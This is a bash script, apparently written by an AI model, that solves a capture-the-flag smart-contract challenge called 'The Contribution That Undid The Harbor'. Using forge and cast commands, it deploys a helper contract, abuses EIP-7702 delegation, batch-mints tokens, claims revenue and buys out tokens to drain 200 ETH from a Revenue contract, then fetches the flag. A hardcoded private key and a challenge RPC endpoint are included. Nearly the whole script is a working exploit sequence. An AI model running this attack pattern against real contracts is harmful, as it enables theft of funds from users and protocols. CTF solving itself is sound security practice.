#!/bin/bash
# Author: Claude AI
# Purpose: Complete exploit for "The Contribution That Undid The Harbor"
# Created: 2025-11-22
# Expected Result: Drain 200 ETH from Revenue contract and get flag
# Last Update: Fresh instance with Helper.sol including receive() function

set -e

# Fresh instance credentials
RPC="http://154.57.164.80:32348/rpc/fbc2b328-f42a-4e3f-a48a-9f266831ac98"
PRIVKEY="40c64f320f8381823cb74a0c0b859ce0d436dca93f5f91af4f4306e56106f63d"
SETUP="0xb5fa47A644a50429bD5b7Fc7768bA64B478bE228"
PLAYER="0x7E0694093dD2C6b81Ed30bD8461687D9906Cb657"
UUID="fbc2b328-f42a-4e3f-a48a-9f266831ac98"

echo "=== THE CONTRIBUTION THAT UNDID THE HARBOR - FINAL EXPLOIT ==="
echo ""

echo "[1] Deploying Helper contract (with receive function)..."
HELPER=$(forge create Helper.sol:Helper --private-key $PRIVKEY --rpc-url $RPC --broadcast --legacy 2>&1 | grep "Deployed to:" | awk '{print $3}')
echo "Helper deployed to: $HELPER"
echo ""

echo "[2] Registering player..."
cast send "$SETUP" "register()" --private-key $PRIVKEY --rpc-url $RPC --legacy >/dev/null
echo "✓ Player registered"
echo ""

echo "[3] Getting contract addresses..."
ROUTER=$(cast call "$SETUP" "router()" --rpc-url "$RPC" | sed 's/0x000000000000000000000000/0x/')
REVENUE=$(cast call "$SETUP" "revenue()" --rpc-url "$RPC" | sed 's/0x000000000000000000000000/0x/')
echo "Router: $ROUTER"
echo "Revenue: $REVENUE"
echo ""

echo "[4] Applying EIP-7702 delegation to Helper..."
cast send "$PLAYER" --value 0 --auth "$HELPER" --private-key $PRIVKEY --rpc-url $RPC --gas-limit 100000 >/dev/null 2>&1
CODE=$(cast code "$PLAYER" --rpc-url "$RPC")
echo "Player code after delegation: $CODE"
if [[ $CODE == 0xef0100* ]]; then
  echo "✓ EIP-7702 delegation successful!"
else
  echo "✗ EIP-7702 delegation failed!"
  exit 1
fi
echo ""

echo "[5] Batch minting 18 contribution tokens..."
cast send "$PLAYER" "batchMint(address,uint256,uint16,uint256)" "$ROUTER" 1 10000 18 \
  --private-key $PRIVKEY --rpc-url $RPC --legacy --gas-limit 10000000 >/dev/null
echo "✓ Minted 18 tokens (IDs 2-19)"
echo ""

echo "[6] Running market to distribute revenue..."
cast send "$SETUP" "runMarket()" --private-key $PRIVKEY --rpc-url $RPC --legacy >/dev/null
echo "✓ Market executed (100 ETH distributed)"
echo ""

echo "[7] Claiming revenue for token 19..."
cast send "$ROUTER" "claimByToken(uint256)" 19 --private-key $PRIVKEY --rpc-url $RPC --legacy >/dev/null
echo "✓ Claimed token 19 revenue"
echo ""

echo "[8] Buying out tokens 2-19 (10 ETH each = 180 ETH)..."
for i in {2..19}; do
  cast send "$ROUTER" "buyout(uint256)" $i --private-key $PRIVKEY --rpc-url $RPC --legacy >/dev/null 2>&1
done
echo "✓ Bought out all 18 tokens"
echo ""

echo "[9] Checking player balance..."
BALANCE=$(cast balance "$PLAYER" --rpc-url "$RPC" --ether)
echo "Player balance: $BALANCE ETH"
echo ""

echo "[10] Checking if solved..."
IS_SOLVED=$(cast call "$SETUP" "isSolved()" --rpc-url "$RPC")
if [[ $IS_SOLVED == *"01" ]]; then
  echo "✅ CHALLENGE SOLVED!"
else
  echo "❌ Not solved yet: $IS_SOLVED"
  exit 1
fi
echo ""

echo "[11] Getting flag..."
curl -s "http://154.57.164.80:32348/api/flag/$UUID"
echo ""
